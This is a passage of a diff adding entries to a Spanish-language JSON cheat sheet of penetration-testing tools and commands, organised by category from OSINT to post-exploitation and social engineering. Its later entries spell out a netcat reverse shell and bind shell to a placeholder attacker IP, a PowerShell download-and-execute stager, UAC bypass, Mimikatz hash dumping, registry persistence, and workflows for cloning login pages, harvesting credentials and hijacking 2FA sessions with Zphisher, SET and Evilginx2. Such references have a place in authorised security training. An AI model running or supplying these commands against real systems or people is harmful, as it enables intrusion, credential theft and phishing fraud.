+        "description": "Descarga 20 archivos PDF/DOCX del dominio y extrae metadatos."
+      },
+      {
+        "type": "Extraer emails",
+        "cmd": "metagoofil -d example.com -t pdf -e",
+        "description": "Busca solo direcciones de correo en los metadatos."
+      },
+      {
+        "type": "Guardar resultados",
+        "cmd": "metagoofil -d example.com -t pdf -f resultados.html",
+        "description": "Exporta los datos a un archivo HTML."
+      }
+    ]
+  },
+  {
+    "category": "OSINT",
+    "name": "Sherlock",
+    "description": "Herramienta para buscar usernames en 100+ redes sociales.",
+    "commands": [
+      {
+        "type": "Búsqueda básica",
+        "cmd": "sherlock username",
+        "description": "Busca un username en todas las plataformas."
+      },
+      {
+        "type": "Filtrar por sitios",
+        "cmd": "sherlock username --site twitter github",
+        "description": "Busca solo en Twitter y GitHub."
+      },
+      {
+        "type": "Guardar resultados",
+        "cmd": "sherlock username -o /ruta/resultados.txt",
+        "description": "Exporta los resultados a un archivo."
+      },
+      {
+        "type": "Usar proxy",
+        "cmd": "sherlock username --proxy http://127.0.0.1:8080",
+        "description": "Realiza peticiones a través de un proxy."
+      }
+    ]
+  },
+  {
+    "category": "OSINT",
+    "name": "TorBot",
+    "description": "Herramienta para scraping en la Dark Web (sitios .onion) mediante Tor.",
+    "commands": [
+      {
+        "type": "Búsqueda básica",
+        "cmd": "python3 torbot.py -q \"query\" -p 5",
+        "description": "Busca un término en la Dark Web (5 páginas)."
+      },
+      {
+        "type": "Extraer enlaces",
+        "cmd": "python3 torbot.py -u http://example.onion -e",
+        "description": "Extrae todos los enlaces de un sitio .onion."
+      },
+      {
+        "type": "Analizar contenido",
+        "cmd": "python3 torbot.py -u http://example.onion -a",
+        "description": "Clasifica el contenido del sitio (texto, imágenes, etc.)."
+      }
+    ]
+  },
+  {
+    "category": "OSINT",
+    "name": "SpiderFoot",
+    "description": "Plataforma de inteligencia de fuentes abiertas para correlación automatizada de datos.",
+    "commands": [
+      {
+        "type": "Escaneo básico",
+        "cmd": "spiderfoot -l -s example.com",
+        "description": "Escaneo completo de un dominio."
+      },
+      {
+        "type": "Escaneo con módulos",
+        "cmd": "spiderfoot -l -s example.com -m sfp_dns,sfp_emails",
+        "description": "Usa solo módulos de DNS y emails."
+      },
+      {
+        "type": "Interfaz web",
+        "cmd": "spiderfoot -p 5001",
+        "description": "Inicia la interfaz web en el puerto 5001."
+      },
+      {
+        "type": "API REST",
+        "cmd": "spiderfoot --rest",
+        "description": "Habilita el acceso mediante API REST."
+      }
+    ]
+  },
+  {
+    "category": "OSINT",
+    "name": "TruffleHog",
+    "description": "Herramienta para detectar credenciales expuestas en repositorios Git y sistemas de archivos.",
+    "commands": [
+      {
+        "type": "Escaneo básico",
+        "cmd": "trufflehog git https://github.com/user/repo.git",
+        "description": "Analiza un repositorio Git en busca de secrets."
+      },
+      {
+        "type": "Fuerza bruta a commits",
+        "cmd": "trufflehog git --branch=develop https://github.com/user/repo.git",
+        "description": "Escanea una rama específica."
+      },
+      {
+        "type": "Verificar archivos locales",
+        "cmd": "trufflehog filesystem /ruta/carpeta",
+        "description": "Analiza archivos locales en busca de credenciales."
+      },
+      {
+        "type": "Usar regex personalizado",
+        "cmd": "trufflehog git https://repo.com --rules=/ruta/reglas.json",
+        "description": "Aplica patrones personalizados para búsqueda."
+      }
+    ]
+  },
+
+  {
+    "category": "Escaneo y Enumeración",
+    "name": "FFUF",
+    "description": "Fuzzer web rápido escrito en Go para descubrimiento de contenido.",
+    "commands": [
+      {
+        "type": "Fuzz de directorios",
+        "cmd": "ffuf -w wordlist.txt -u http://target.com/FUZZ",
+        "description": "Busca directorios y archivos."
+      },
+      {
+        "type": "Fuzz de subdominios",
+        "cmd": "ffuf -w wordlist.txt -u http://FUZZ.target.com",
+        "description": "Busca subdominios."
+      },
+      {
+        "type": "Fuzz de parámetros",
+        "cmd": "ffuf -w wordlist.txt -u http://target.com/page?FUZZ=value",
+        "description": "Busca parámetros GET."
+      },
+      {
+        "type": "Con filtros",
+        "cmd": "ffuf -w wordlist.txt -u http://target.com/FUZZ -fc 404",
+        "description": "Filtra respuestas 404."
+      }
+    ]
+  },
+
+  {
+    "category": "Post-Explotación y Persistencia",
+    "name": "Empire",
+    "description": "Framework de post-explotación con agentes PowerShell/Python para movimiento lateral y persistencia.",
+    "commands": [
+      {
+        "type": "Iniciar listener",
+        "cmd": "(Empire) > listeners\n(Empire: listeners) > uselistener http\n(Empire: listeners/http) > execute",
+        "description": "Configura un listener HTTP para agentes."
+      },
+      {
+        "type": "Generar stager",
+        "cmd": "(Empire) > usestager multi/launcher\n(Empire: stager/multi/launcher) > set Listener http\n(Empire: stager/multi/launcher) > generate",
+        "description": "Genera un payload PowerShell para conexión."
+      },
+      {
+        "type": "Ejecutar módulo",
+        "cmd": "(Empire) > usemodule persistence/registry\n(Empire: persistence/registry) > set Agent X3Z9\n(Empire: persistence/registry) > execute",
+        "description": "Establece persistencia vía registro Windows."
+      },
+      {
+        "type": "Movimiento lateral",
+        "cmd": "(Empire) > usemodule lateral_movement/invoke_wmi\n(Empire: lateral_movement/invoke_wmi) > set ComputerName DC01\n(Empire: lateral_movement/invoke_wmi) > execute",
+        "description": "Ejecuta payload en máquina remota via WMI."
+      }
+    ]
+  },
+  {
+    "category": "Post-Explotación y Persistencia",
+    "name": "Netcat",
+    "description": "Herramienta de red para conexiones TCP/UDP, transferencia de archivos y binds/reverse shells.",
+    "commands": [
+      {
+        "type": "Shell inversa",
+        "cmd": "nc -lvnp 4444 (atacante)\nnc -e /bin/sh <IP_ATACANTE> 4444 (víctima)",
+        "description": "Establece reverse shell desde la víctima."
+      },
+      {
+        "type": "Bind shell",
+        "cmd": "nc -lvnp 5555 -e /bin/bash (víctima)\nnc <IP_VÍCTIMA> 5555 (atacante)",
+        "description": "Abre puerto en víctima para conexión."
+      },
+      {
+        "type": "Transferencia de archivos",
+        "cmd": "nc -lvnp 4444 > archivo (receptor)\nnc -w 3 <IP_RECEPTOR> 4444 < archivo (emisor)",
+        "description": "Envía archivos entre sistemas."
+      },
+      {
+        "type": "Escaneo de puertos",
+        "cmd": "nc -zv <IP> 20-80",
+        "description": "Escanea rango de puertos (no silencioso)."
+      }
+    ]
+  },
+  {
+    "category": "Post-Explotación y Persistencia",
+    "name": "PowerShell Empire",
+    "description": "Versión PowerShell del framework Empire para administración de agentes y post-explotación.",
+    "commands": [
+      {
+        "type": "Iniciar agente",
+        "cmd": "powershell -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://<IP>/launcher.ps1')\"",
+        "description": "Ejecuta stager para conectar al listener."
+      },
+      {
+        "type": "Elevación de privilegios",
+        "cmd": "(Empire: PS) > usemodule privesc/bypassuac\n(Empire: privesc/bypassuac) > set Agent K7P2\n(Empire: privesc/bypassuac) > execute",
+        "description": "Bypass UAC para ganar privilegios admin."
+      },
+      {
+        "type": "Robo de credenciales",
+        "cmd": "(Empire: PS) > usemodule credentials/mimikatz/lsadump\n(Empire: credentials/mimikatz/lsadump) > execute",
+        "description": "Extrae hashes NTLM con Mimikatz."
+      },
+      {
+        "type": "Persistencia",
+        "cmd": "(Empire: PS) > usemodule persistence/userland/registry\n(Empire: persistence/userland/registry) > set DailyTime 14:30\n(Empire: persistence/userland/registry) > execute",
+        "description": "Agenda ejecución diaria vía registro."
+      }
+    ]
+  },
+
+   {
+    "category": "Ingenieria Social",
+    "name": "Zphisher",
+    "description": "Herramienta automatizada de phishing con plantillas preconfiguradas para redes sociales y servicios populares.",
+    "commands": [
+      {
+        "type": "Iniciar Zphisher",
+        "cmd": "./zphisher.sh",
+        "description": "Ejecuta el menú interactivo con opciones de phishing."
+      },
+      {
+        "type": "Seleccionar plantilla",
+        "cmd": "Seleccionar opción (ej: 'Instagram') del menú",
+        "description": "Elije el servicio a clonar para el ataque."
+      },
+      {
+        "type": "Configurar redirección",
+        "cmd": "Ingresar URL legítima para redirección post-login",
+        "description": "Evita sospechas después de capturar credenciales."
+      },
+      {
+        "type": "Obtener credenciales",
+        "cmd": "Ver archivo 'usernames.txt' en /var/www/html",
+        "description": "Muestra las credenciales capturadas."
+      }
+    ]
+  },
+{
+    "category": "Ingenieria Social",
+    "name": "SET (Social Engineering Toolkit)",
+    "description": "Framework integral para ataques de ingeniería social (phishing, smishing, generación de payloads).",
+    "commands": [
+      {
+        "type": "Iniciar SET",
+        "cmd": "setoolkit",
+        "description": "Abre la interfaz interactiva."
+      },
+      {
+        "type": "Ataque de phishing",
+        "cmd": "Seleccionar: 1) Social-Engineering Attacks > 2) Website Attack Vectors > 3) Credential Harvester",
+        "description": "Clona un sitio web para robo de credenciales."
+      },
+      {
+        "type": "Generar payload malicioso",
+        "cmd": "Seleccionar: 1 > 4) Create a Payload and Listener > 2) Windows Reverse_TCP Meterpreter",
+        "description": "Crea un ejecutable infectado."
+      },
+      {
+        "type": "Ataque QR malicioso",
+        "cmd": "Seleccionar: 1 > 7) QRCode Generator Attack",
+        "description": "Genera código QR que redirige a sitio falso."
+      }
+    ]
+  },
+  {
+    "category": "Ingenieria Social",
+    "name": "Evilginx2",
+    "description": "Proxy inverso para phishing avanzado que evade 2FA mediante sesiones hijacking.",
+    "commands": [
+      {
+        "type": "Iniciar Evilginx",
+        "cmd": "evilginx",
+        "description": "Abre la consola interactiva."
+      },
+      {
+        "type": "Configurar phishlet",
+        "cmd": "config domain <tu_dominio>\nphishlets hostname <phishlet> <subdominio>\nphishlets enable <phishlet>",
+        "description": "Prepara un servicio para clonar (ej: o365, gmail)."
+      },
+      {
+        "type": "Iniciar captura",
+        "cmd": "sessions",
+        "description": "Muestra sesiones activas con credenciales/coockies."
+      },
+      {
+        "type": "Hijack de sesión",
+        "cmd": "sessions <id>",
+        "description": "Secuestra la sesión de la víctima para bypass 2FA."
+      }
+    ]
+  },
+  {
+    "category": "Ingenieria Social",
+    "name": "King Phisher",
+    "description": "Herramienta cliente/servidor para campañas de phishing personalizables con seguimiento avanzado.",
+    "commands": [
+      {
+        "type": "Iniciar servidor",
+        "cmd": "king-phisher server start",
+        "description": "Levanta el servidor para administrar campañas."
+      },
+      {
+        "type": "Clonar sitio web",
+        "cmd": "Usar la GUI > Template Editor > Importar HTML",
+        "description": "Crea una réplica convincente del sitio objetivo."
+      },
+      {
+        "type": "Enviar campaña",
+        "cmd": "GUI > Campaigns > Nueva campaña (configurar SMTP y destinatarios)",
+        "description": "Envía emails de phishing masivos."
+      },
+      {
+        "type": "Analizar resultados",
+        "cmd": "GUI > View Submitted Data",
+        "description": "Visualiza credenciales capturadas y métricas."
+      }
+    ]
+  }
+
+]
+
